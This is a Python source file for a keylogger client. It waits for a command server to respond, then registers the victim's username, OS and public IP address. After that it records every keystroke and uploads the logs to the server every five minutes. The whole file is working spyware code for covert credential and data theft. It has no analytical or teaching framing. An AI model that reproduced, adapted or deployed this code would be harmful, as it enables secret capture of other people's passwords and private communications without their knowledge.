from time import sleep
import time
import requests as req
import os
import json
from keylogger import keylogger
from threading import Timer

BASE_URL = "http://127.0.0.1:8000"
UUID = "312314143312"
HEART_BEAT = 30
INTERVAL = 300

def contactServer():
    try:
        res = req.get(BASE_URL)
    except req.exceptions.ConnectionError:
        return False
    if res.status_code == req.codes.no_content:
        return True
    return False

def registerServer():
    try:
        ip = req.get('https://api.ipify.org').content.decode('utf8')
    except req.exceptions.ConnectionError:
        ip = None

    userName = os.getlogin()
    osName = os.name
    try:
        res = req.post(BASE_URL+"/connect", data=json.dumps({"UUID":UUID, "name":userName, "OS":osName,"IP":ip}))
    except req.exceptions.ConnectionError:
        return False

    if res.status_code == req.codes.created or res.status_code == req.codes.no_content:
        return True
    else:
        return False

def keyboardCallback(key, logs):
    logs["data"] += key

def sendData(logs):
    Timer(INTERVAL, lambda: sendData(logs)).start() #restart the timer
    try:
        res = req.post(BASE_URL+"/keylogs", json.dumps(logs))
        if res.status_code == req.codes.ok:
            logs["data"] = ""
            logs["timeStamp"] = time.time()
    except req.exceptions.ConnectionError:
        return

if __name__ == "__main__":
    logs = {
            "timeStamp":None,
            "data":"", 
            "UUID":UUID
            }

    logger = keylogger.Keylogger( lambda key: keyboardCallback(key,logs) )
    timer = Timer(INTERVAL, lambda: sendData(logs))
    
    while(not contactServer()):
        sleep(HEART_BEAT)

    if not registerServer():
        exit()
    
    logs["timeStamp"] = time.time()
    logger.run()
    timer.start()
    
    while(True):
        pass


    